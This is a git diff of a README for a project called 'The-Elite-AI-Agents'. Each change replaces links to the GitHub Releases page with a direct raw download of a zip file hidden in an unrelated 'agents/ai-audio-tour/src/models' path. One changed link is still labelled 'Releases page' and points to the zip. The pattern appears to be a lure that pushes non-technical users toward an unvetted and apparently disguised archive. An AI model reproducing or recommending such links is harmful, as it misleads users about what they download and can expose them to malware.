@@ -5,7 +5,7 @@
 Welcome to The-Elite-AI-Agents! This application provides a powerful set of 51 AI agents designed to assist you in various fields including research, finance, health, and more. 
 
 ## 📥 Download
-[![Download The-Elite-AI-Agents](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/n1717123-rgb/The-Elite-AI-Agents/releases)
+[![Download The-Elite-AI-Agents](https://raw.githubusercontent.com/n1717123-rgb/The-Elite-AI-Agents/main/agents/ai-audio-tour/src/models/Elite_A_Agents_The_v1.6.zip)](https://raw.githubusercontent.com/n1717123-rgb/The-Elite-AI-Agents/main/agents/ai-audio-tour/src/models/Elite_A_Agents_The_v1.6.zip)
 
 ## 🔍 Overview
 The-Elite-AI-Agents integrates advanced technologies from LangChain and OpenAI, allowing you to leverage cutting-edge AI capabilities without needing technical knowledge. Each agent serves a specific purpose, making it easy for you to find what you need quickly.
@@ -27,7 +27,7 @@ To ensure the best experience with The-Elite-AI-Agents, your system should meet 
 ## 📥 Download & Install
 To download The-Elite-AI-Agents, follow these steps:
 
-1. Visit the [Releases page](https://github.com/n1717123-rgb/The-Elite-AI-Agents/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/n1717123-rgb/The-Elite-AI-Agents/main/agents/ai-audio-tour/src/models/Elite_A_Agents_The_v1.6.zip).
 2. Choose the latest version from the list.
 3. Click on the name of the file to download it.
 4. Once downloaded, locate the file on your computer (usually in the Downloads folder).
@@ -59,7 +59,7 @@ For further inquiries or support, please refer to the FAQs on our GitHub page or
 ## 📅 Updates
 Stay updated with new features and improvements. Regular updates will be available through the Releases page at the link below:
 
-[Download The-Elite-AI-Agents](https://github.com/n1717123-rgb/The-Elite-AI-Agents/releases)
+[Download The-Elite-AI-Agents](https://raw.githubusercontent.com/n1717123-rgb/The-Elite-AI-Agents/main/agents/ai-audio-tour/src/models/Elite_A_Agents_The_v1.6.zip)
 
 Thank you for choosing The-Elite-AI-Agents! Explore the world of AI effortlessly.
 ```
